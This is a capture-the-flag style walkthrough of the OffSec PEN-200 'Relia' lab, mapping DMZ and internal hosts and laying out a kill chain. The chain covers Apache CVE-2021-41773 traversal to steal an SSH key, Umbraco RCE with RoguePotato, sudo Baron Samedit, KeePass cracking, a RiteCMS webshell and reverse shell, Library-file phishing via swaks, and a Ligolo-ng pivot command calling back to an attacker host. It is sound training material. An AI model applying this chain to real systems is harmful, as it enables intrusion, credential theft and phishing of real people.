---
tags: [OffSec, Relia, ChallengeLab, Windows, ActiveDirectory, CVE-2021-41773, CVE-2021-3156, RoguePotato, Umbraco, RiteCMS, KeePass, ClientSideAttacks, LibraryFile, Phishing, Ligolo, MultiMachine, Pivot]
platform: OffSec Proving Grounds
os: Windows
hostname: DC02
difficulty: Challenge (multi-machine, PEN-200 Challenge 2)
ip: $BoxIP
status: Complete (reference from official write-ups)
box: Relia
domain: relia.com
---

# OffSec PEN-200 Challenge 2: Relia (multi-machine)

## The gist

Relia is a two-tier timber/industrial AD environment. The DMZ (`192.168.183.0/24` in this
instance) hosts 8 machines; the internal network (`172.16.183.0/24`) hosts 8 more, including
DC02. The internal segment is **firewalled off from the DMZ** — you cannot tunnel into it. The
first internal foothold is obtained with a **client-side attack (phishing an internal user)**, then
you run **Ligolo-ng** from that internal host to reach DC02.

**Anti-circle rule:** a uniform `503 Backend not available` on every internal `:80/:443` from every
pivot origin is the *isolated edge*, not a target. Do NOT retry Chisel/Ligolo from DMZ hosts into
`172.16.x`.

## Box information

| Item | Value |
|---|---|
| Platform | OffSec Proving Grounds (PEN-200 Challenge 2) |
| OS | Windows Server 2022 + Ubuntu + Windows 11 |
| Internal DC | DC02 (`172.16.183.6`) |
| First internal host | WK01 (`172.16.183.14`) |
| Domain | `relia.com` |
| Internal entry | client-side phishing -> Ligolo-ng |

## Machine map (public / DMZ)

| IP | Host | Notes |
|---|---|---|
| .189 | MAIL | hMailServer (SMTP/POP3/IMAP); send the phishing email here |
| .191 | LOGIN | domain member `LOGIN.DMZ.RELIA.COM`; IIS + WinRM 5985/5986 |
| .245 | WEB01 | Ubuntu Apache **2.4.49** (CVE-2021-41773) + FTP + :8000; anita SSH :2222 |
| .246 | WEB03 / DEMO | Ubuntu, "demo" |
| .247 | WEB02 | Windows Apache + **Umbraco**; anon FTP on unusual port (`14020`) |
| .248 | EXTERNAL | Windows IIS + DNN; SMB share; KeePass on share |
| .249 | LEGACY | Windows IIS + **RiteCMS** (XAMPP :8000); mail creds live here |
| .250 | WINPREP | Windows 11, given creds `offsec`/`lab` (starting foothold) |

## Internal map (`172.16.183.0/24`)

| IP | Host | Notes |
|---|---|---|
| .6 | DC02 | Domain Controller |
| .7 | INTRANET | Windows WordPress -> AS-REP roast -> RDP |
| .14 | WK01 | first internal foothold (phishing lands here) |
| .15 | WK02 | workstation |
| .5 | MAIL | internal mail |
| .20 | Linux | SSH only |
| .21 | WEBBY | WordPress |
| .19 / .30 | WEBBY | workstations |

## Kill chain (order that works)

1. **Recon** all DMZ hosts (full TCP). Identify WEB01 Apache 2.4.49, WEB02 Umbraco, EXTERNAL SMB.
2. **WEB02 (.247):** anonymous FTP on the non-standard port -> `umbraco.pdf` -> creds -> Umbraco at
   `web02.relia.com:<ephemeral>` -> login -> authenticated RCE (EDB 49488) -> SeImpersonate ->
   **RoguePotato** -> SYSTEM. Harvest creds.
3. **WEB01 (.245):** CVE-2021-41773 path traversal (`50383.sh`) to read files out-of-root, including
   `/home/anita/.ssh/id_ecdsa`; crack the key passphrase; SSH `anita@.245:2222`.
4. **WEB01 root:** **CVE-2021-3156 (sudo 1.8.31 "Baron Samedit")** — *not* PwnKit; pkexec fails here.
5. **EXTERNAL (.248):** SMB with the weak/guest creds -> `transfer` share; DNN db creds; KeePass
   DB -> crack -> more accounts; environment-variable `AppKey` holds a plaintext password.
6. **LEGACY (.249):** RiteCMS `admin:admin` -> upload PHP webshell -> reverse shell as adrian ->
   pivot to damon -> `evil-winrm`. Staging tree (`C:\staging\htdocs\cms\data`, `C:\xampp\htdocs\cms`)
   holds the **MAIL credentials** (`maildmz@relia.com`) and the internal target user (`jim@relia.com`).
7. **INTERNAL ENTRY (client-side):** stand up WsgiDAV (anonymous) serving a Windows Library file
   `config.Library-ms`; `swaks` a phishing email from `maildmz@relia.com` to `jim@relia.com` via
   MAIL `.189`. When jim opens it, you get code execution on **WK01 (.14)**.
8. **Pivot:** copy `agent.exe` (Ligolo-ng) to WK01, run `agent.exe -connect <KALI>:11601 -ignore-cert`;
   on Kali `proxy -selfcert` + `ip route add 172.16.183.0/24 dev ligolo`. Now enumerate the internal net directly.
9. **DC02:** with internal creds (jim / dmzadmin) enumerate DC02, AS-REP roast on INTRANET `.7`
   (michelle) -> RDP -> domain escalation. Compromise DC02 -> objective met.

## Techniques to remember

- **Internal entry = client-side, not a network tunnel.** Library-file phishing via WebDAV
  (see `Client-Side Attacks` command appendix; app page `client-side-attacks`).
- **Baron Samedit** for sudo 1.8.31 on WEB01 (see app `linux-privesc` / CVE-2021-3156).
- **Anon FTP on a non-standard port** hides creds (WEB02).
- **RoguePotato / SeImpersonate** after a service account RCE.
- **KeePass `.kdbx` + `keepass2john` -> hashcat 13400**, and **env-var `AppKey`** for plaintext creds.
- **Ligolo-ng** for the DMZ->internal transition once you own an internal host.

## Anti-circle ledger

- CLOSED: tunneling from a DMZ host into `172.16.183.0/24` (segment is isolated; 503 edge).
- CLOSED: Host-header fuzzing the internal 503 (no backend; not a target).
- CLOSED: PwnKit/pkexec on WEB01 (sudo is 1.8.31 -> use CVE-2021-3156).
- NEXT: recover MAIL creds from LEGACY staging -> phishing -> WK01 -> Ligolo -> DC02.
